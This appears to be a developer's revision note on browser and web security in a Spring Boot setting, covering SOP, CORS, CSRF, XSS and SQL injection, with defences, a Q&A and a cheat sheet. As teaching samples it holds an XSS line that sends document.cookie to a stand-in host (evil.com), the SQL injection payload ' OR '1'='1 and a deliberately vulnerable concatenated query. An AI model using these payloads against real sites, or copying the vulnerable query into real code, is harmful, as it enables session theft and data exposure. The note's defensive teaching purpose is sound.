## Same-Origin Policy (SOP)

A browser security mechanism that restricts how a page from one origin can interact with resources from another origin. An **origin** is `protocol + domain + port` (e.g. `https://myapp.com:443`).

| Request From            | Request To                       | Same Origin?               |
| ----------------------- | -------------------------------- | -------------------------- |
| `https://myapp.com`     | `https://myapp.com/api/users`    | Yes                        |
| `https://myapp.com`     | `https://api.myapp.com`          | No (different subdomain)   |
| `https://myapp.com`     | `http://myapp.com`               | No (different protocol)    |
| `https://myapp.com`     | `https://myapp.com:8080`         | No (different port)        |

The key mechanic: SOP blocks JavaScript on one origin from **reading** another origin's response or cookies. It does not block the browser from **sending** the request (with cookies) in the first place; it only blocks JS from reading the response. This is exactly why CSRF stays possible: the damage is in the request being executed, not in reading the response.

---

## Cross-Origin Resource Sharing (CORS)

A mechanism where the backend explicitly allows specific origins to read its responses, relaxing the browser's SOP for trusted origins. It exists because frontend and backend usually live on different origins (e.g. `localhost:3000` calling `localhost:8080`), which SOP would otherwise block.

### Simple vs Preflight

- **Simple request** (`GET`, `HEAD`, or `POST` with form/`text/plain` body): browser sends `Origin`; backend echoes `Access-Control-Allow-Origin`. If it is missing or does not match, the browser blocks the response (CORS error).
- **Preflight request** (`PUT`, `PATCH`, `DELETE`, custom headers like `Authorization`, or `Content-Type: application/json`, i.e. most API calls): the browser first sends an `OPTIONS` probe and only sends the real request if the response permits it. A rejected preflight means the real request is never sent.

```http
OPTIONS /api/employees/1
Origin: http://localhost:3000
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization
```

```http
Access-Control-Allow-Origin: http://localhost:3000
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization
```

### Spring Boot Configuration

Configure per-controller with `@CrossOrigin(origins = "http://localhost:3000")`, or globally via a `WebMvcConfigurer` bean overriding `addCorsMappings()`.

> **Note**: with Spring Security on the classpath, CORS must be enabled in the security filter chain via `http.cors(...)` backed by a `CorsConfigurationSource` bean. Otherwise the unauthenticated preflight `OPTIONS` is rejected by the chain before it ever reaches MVC's `addCorsMappings()`.

CORS is not a security mechanism; it is the backend choosing to relax browser restrictions. It only applies in browsers, so `curl` and Postman bypass it entirely.

> **Reference**: filter-chain CORS/CSRF wiring lives in [5.4. Filter Chain Configuration.md](<5.4. Filter Chain Configuration.md>).

## Cross-Site Request Forgery (CSRF)

An attack that tricks an already-authenticated user into performing an unintended action on a web app. Because browsers attach cookies (including session cookies) to every request to a domain automatically, a malicious page can fire a hidden request to `bank.com/transfer?amount=1000` and the server treats it as the real user. SOP does not stop this: the request is still sent and executed; the attacker never needs to read the response.

### When CSRF Is a Risk

- **Session/cookie auth**: at risk, the browser sends the cookie automatically.
- **JWT in `Authorization` header**: safe, the browser does not auto-send custom headers.
- **JWT in cookie** (incl. `HttpOnly`): at risk, same auto-send problem as any cookie.

### Prevention

- **Synchronizer token**: server sets an unpredictable token in a non-`HttpOnly` cookie; JS reads it and echoes it in a custom header (`X-XSRF-TOKEN`); server rejects when cookie and header disagree. It works because an attacker can trigger the request (cookie auto-sent) but cannot read the cookie (SOP) to set the matching header.
- **`SameSite` cookie attribute**: the modern default defense. Modern browsers treat unspecified cookies as `SameSite=Lax`.

  | Value    | Behavior                                                                          |
  | -------- | --------------------------------------------------------------------------------- |
  | `Strict` | Never sent on cross-site requests.                                                |
  | `Lax`    | Sent only on top-level navigation (link clicks); blocked on cross-site POST/AJAX. |
  | `None`   | Always sent; requires the `Secure` flag (HTTPS).                                  |

  `Lax` blocks exactly the cross-site POST/AJAX that CSRF relies on while keeping normal link navigation, so a token is not strictly needed alongside it.
- **Stateless JWT (no cookies)**: token held in JS memory and sent as `Authorization: Bearer <token>` gives the browser nothing to auto-attach.

> **Note**: Spring Security enables CSRF protection by default for browser/session apps; stateless token APIs typically disable it (`csrf(csrf -> csrf.disable())`). A lingering `XSRF-TOKEN` cookie under `SameSite=Lax` is usually a framework fallback for older browsers.

## Cross-Site Scripting (XSS)

An attack that injects malicious script into pages viewed by other users. If a comment like `<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>` is rendered unescaped, every viewer leaks their cookies.

- **Output encoding**: encode user-derived data before rendering so `<script>` becomes `&lt;script&gt;` and displays as text. Thymeleaf auto-escapes views; SPA frameworks (React, Angular) auto-escape interpolated values; `HtmlUtils.htmlEscape(input)` covers manual/server-rendered cases.
- **Input validation**: reject or sanitize untrusted input at the boundary.
- **Content-Security-Policy**: the modern primary layer, restricting which scripts the browser will execute even if injection slips through.
- **`HttpOnly` cookies**: do not prevent XSS but stop `document.cookie` from leaking the session token, limiting damage.

---

## SQL Injection

An attack that injects malicious SQL through input to alter a query's logic.

```sql
-- template:        SELECT * FROM users WHERE username = 'input';
-- attacker input:  ' OR '1'='1
-- result (returns ALL users):
SELECT * FROM users WHERE username = '' OR '1'='1';
```

Prevent with **parameterized queries**: the SQL structure is fixed first and values bind separately as pure data, never parsed as SQL.

```java
// vulnerable: input becomes SQL structure
String sql = "SELECT * FROM users WHERE username = '" + input + "'";

// safe: input bound as data
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?");
ps.setString(1, input);
```

Spring Data JPA derived queries and bound `@Query` parameters are parameterized by default.

> **Note**: string-concatenating user input into `@Query(nativeQuery = true)` reintroduces the vulnerability; always bind with `:param`, never concatenate.

## Security Headers Summary

| Header                        | Purpose                                                      |
| ----------------------------- | ----------------------------------------------------------- |
| `SameSite`                    | Controls cross-site cookie sending (CSRF defense).          |
| `HttpOnly`                    | Blocks JS from reading the cookie (limits XSS damage).      |
| `Secure`                      | Cookie sent only over HTTPS.                                 |
| `Content-Security-Policy`     | Restricts which scripts the browser executes (XSS defense). |
| `Access-Control-Allow-Origin` | CORS, declares which origins may read responses.            |

## Q&A

1. **Why does the Same-Origin Policy not prevent CSRF?**
SOP blocks JS from *reading* cross-origin responses, but the browser still *sends* the request with cookies attached. The damage happens server-side on execution, so the attacker never needs the response.

2. **Is CORS a security mechanism?**
No. It is the backend relaxing SOP for trusted origins, and it only applies in browsers. `curl` and Postman ignore it; real protection comes from authentication and authorization.

3. **When is CSRF a risk with JWT?**
Only when the JWT rides in a cookie (auto-sent). A JWT in the `Authorization: Bearer` header is CSRF-safe because browsers do not auto-attach custom headers.

4. **How does `SameSite=Lax` stop CSRF?**
The browser refuses to attach the cookie on cross-site POST/AJAX, so the forged request arrives unauthenticated. Top-level link navigation still carries it.

5. **Why must CORS be configured on the Spring Security filter chain, not just MVC?**
The chain runs before MVC. Without `http.cors(...)`, the unauthenticated preflight `OPTIONS` is rejected before reaching `addCorsMappings()`, so every cross-origin call fails.

6. **How do parameterized queries prevent SQL injection?**
The SQL structure is compiled with placeholders first; input binds afterward as pure data, so `' OR '1'='1` is treated as a literal string, not an operator.

## Quick Revision Cheat Sheet

| Concept           | Remember                                                            |
| ----------------- | ------------------------------------------------------------------ |
| Origin            | protocol + domain + port; any difference is cross-origin.          |
| SOP boundary      | Blocks reading the response, not sending the request.              |
| CORS              | Backend relaxes SOP; browser-only, not security.                   |
| Preflight trigger | `PUT`/`PATCH`/`DELETE`, custom headers, or JSON content-type.      |
| CORS + Security   | Needs `http.cors()`; chain runs before MVC mappings.               |
| CSRF risk         | Cookie-based auth only; bearer-header JWT is safe.                  |
| CSRF defense      | `SameSite=Lax` (default) or synchronizer token.                    |
| `SameSite=None`   | Requires `Secure` (HTTPS).                                          |
| XSS defense       | Output encoding + CSP; `HttpOnly` only limits damage.              |
| SQL injection     | Parameterized queries; never concatenate, incl. native `@Query`.   |
